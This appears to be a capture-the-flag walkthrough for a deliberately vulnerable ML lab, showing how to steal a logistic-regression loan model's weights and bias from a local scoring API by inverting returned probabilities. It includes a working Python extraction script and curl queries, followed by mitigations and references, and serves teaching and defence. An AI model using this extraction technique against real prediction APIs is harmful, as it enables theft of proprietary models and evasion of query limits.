# Model Heist — Walkthrough

> ⚠️ SPOILER: this file contains the full solution.

## Scenario recap

FinCorp's loan API returns an approval probability for five numeric features
and allows 50 score queries per service start. You must recover the model's
five weights and its bias (each within 0.05) and send them to `/verify`.

## Recon

```bash
tensorgoat create model_heist
curl http://127.0.0.1:8103/
```

`GET /` lists the feature names (`income`, `debt_ratio`, `years_employed`,
`num_accounts`, `late_payments`), their range (0 to 1) and the remaining
budget. One test query:

```bash
curl -X POST http://127.0.0.1:8103/score \
     -H 'Content-Type: application/json' \
     -d '{"features": [0.5, 0.5, 0.5, 0.5, 0.5]}'
# {"approval_probability": 0.512345, "queries_remaining": 49}
```

Two observations matter: the answer is a probability with six decimals, and
five plain numeric inputs go in. A probability computed from a weighted sum of
a few features is the signature of **logistic regression**.

## Exploitation (step by step, with code snippets)

Logistic regression computes

```
p = sigmoid(w·x + b) = 1 / (1 + exp(-(w·x + b)))
```

The sigmoid has an inverse, the logit:

```
logit(p) = ln(p / (1 - p)) = w·x + b
```

So every query gives one *linear* equation in the six unknowns, and we choose
`x`:

- `x = [0, 0, 0, 0, 0]` gives `logit(p) = b`
- `x = [1, 0, 0, 0, 0]` gives `logit(p) = w1 + b`, and so on for each feature

Six queries, no linear algebra library needed:

```python
import math, httpx

URL = "http://127.0.0.1:8103"


def logit(p):
    return math.log(p / (1 - p))


def query(x):
    return logit(httpx.post(f"{URL}/score", json={"features": x}).json()["approval_probability"])


bias = query([0, 0, 0, 0, 0])
weights = []
for i in range(5):
    x = [0.0] * 5
    x[i] = 1.0
    weights.append(query(x) - bias)

print(httpx.post(f"{URL}/verify", json={"weights": weights, "bias": bias}).json())
```

The alternative that also works when you cannot choose such clean inputs: send
a handful of random feature vectors, compute `logit(p)` for each and solve the
resulting system with least squares (`numpy.linalg.lstsq`).

## Why this works

The API hands out exactly the information that defines the model. A logistic
regression with `n` features has `n + 1` parameters, and each precise
probability is one exact equation about them. The "secret" is gone after
`n + 1` well-chosen queries; the budget of 50 is not even close to being a
problem.

Three design choices made it this easy:

1. **Full-precision confidence scores.** Six decimals let us invert the sigmoid
   almost exactly.
2. **A simple, guessable model family.** Linear models are extracted exactly.
   Larger models cannot be solved in closed form, but they can be *approximated*
   by training a copy on query results, which is the same attack at a larger
   scale.
3. **Attacker-chosen inputs.** The API accepts inputs no real applicant would
   have (all zeros, a single 1), which isolate the parameters.

## Mitigation / Defense

- **Return less.** If the caller only needs a decision, return the decision
  (approved / declined) or a coarse band, not a six-decimal probability.
  Rounding or binning scores makes each query less informative. Note that this
  raises the cost of extraction; it does not make it impossible.
- **Rate limit and budget per identity, not per process.** A budget that resets
  on restart or per connection is no budget. Tie limits to authenticated
  accounts and watch total volume over time.
- **Detect extraction patterns.** Queries from real users look like real
  applicants. Inputs at the edges of the feature space (all zeros, unit
  vectors), systematic sweeps or unusually uniform coverage are signals worth
  alerting on.
- **Validate inputs against realistic ranges and combinations**, and reject or
  flag inputs that cannot come from the real data distribution.
- **Do not rely on secrecy of the model.** Assume a determined client can
  approximate any model it can query. Protect what actually matters (the
  training data, the business logic around the model) with access control,
  contracts and monitoring, and consider watermarking if provenance matters.

## Real-world references

- Tramèr et al., "Stealing Machine Learning Models via Prediction APIs" (USENIX
  Security 2016), which includes the equation-solving attack used here:
  <https://arxiv.org/abs/1609.02943>
- OWASP Machine Learning Security Top 10, ML05:2023 Model Theft:
  <https://owasp.org/www-project-machine-learning-security-top-10/>
- MITRE ATLAS, technique "Extract AI Model": <https://atlas.mitre.org/>
